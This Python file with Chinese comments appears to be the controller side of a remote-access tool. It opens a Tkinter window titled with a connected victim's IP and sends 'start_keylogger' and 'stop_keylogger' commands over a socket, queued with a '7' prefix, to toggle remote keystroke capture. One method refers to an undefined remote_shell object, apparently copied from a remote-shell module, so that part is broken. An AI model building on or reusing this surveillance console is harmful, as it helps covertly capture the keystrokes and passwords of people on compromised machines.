import socket
from tkinter import * 
import tkinter as tk
from queue import Queue
import logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
class Keyboard: 
    '''
    开启一个键盘监控窗口
    '''
    def __init__(self, master, client: socket.socket, send_buf: Queue, recv_buf: Queue):
        self.master = master  # 父窗口
        self.client = client  # socket
        # 获取与当前 socket 连接的远程主机的地址信息。该方法返回一个包含远程主机地址的元组
        self.ip = client.getpeername()[0]
        self.remote_keyboard = RemoteKeyboard(client, send_buf, recv_buf)
        self.create_keyboard()
    
    def create_keyboard(self):
        '''
        新开窗口
        '''
        self.popup = Toplevel(self.master)
        self.popup.title(f"Keyboard - {self.ip}")
        self.popup.geometry("800x600")
        self.popup.resizable(False, False)
        
        # 关闭窗口时关闭keyboard
        self.popup.protocol("WM_DELETE_WINDOW", self.close_keyboard)
        
        self.text_area = Text(self.popup, bg="black", fg="white", insertbackground="white", wrap=tk.WORD)
        self.text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # 滚动条
        scroll_bar = Scrollbar(self.text_area)
        scroll_bar.pack(side=tk.RIGHT, fill=tk.Y)
        self.text_area.config(yscrollcommand=scroll_bar.set)
        scroll_bar.config(command=self.text_area.yview)
        
        # 开始监控按钮
        start_button = tk.Button(
            self.popup, text="开始监控", command=self.start_monitoring)
        start_button.pack(side=tk.LEFT, padx=10, pady=10)

        # 停止监控按钮
        stop_button = tk.Button(self.popup, text="停止监控",
                                command=self.stop_monitoring)
        stop_button.pack(side=tk.RIGHT, padx=10, pady=10)
    
    def start_monitoring(self):
        self.remote_keyboard.send_command("start_keylogger")
        # self.receive_keys()

    def stop_monitoring(self):
        self.remote_keyboard.send_command("stop_keylogger")
        
    def execute_command(self, event):
        # 获取用户输入的命令
        command = self.entry.get().strip()
        if not command:
            return

        # 清空输入框
        self.entry.delete(0, tk.END)

        # 显示输入命令
        self.text_area.insert(tk.END, command + "\n")

        # 发送命令并显示返回结果
        result = self.remote_shell.send_command(command)
        # 输入exit时关闭
        if result == 'exit':
            self.popup.destroy()
        self.text_area.insert(tk.END, result + "\n")
        self.text_area.insert(tk.END, f"{self.remote_shell.ip}> ")

        # 自动滚动到最新内容
        self.text_area.see(tk.END)
        
    def close_keyboard(self):
        self.stop_monitoring()
        self.popup.destroy()

class RemoteKeyboard:
    def __init__(self, client: socket.socket, send_buf: Queue, recv_buf: Queue):
        self.client = client
        self.ip = client.getpeername()[0]
        self.send_buf = send_buf
        self.recv_buf = recv_buf

    def send_command(self, command):
        command = '7' + command
        logging.debug(f"keyboard send: {command}")
        self.send_buf.put(command.encode())
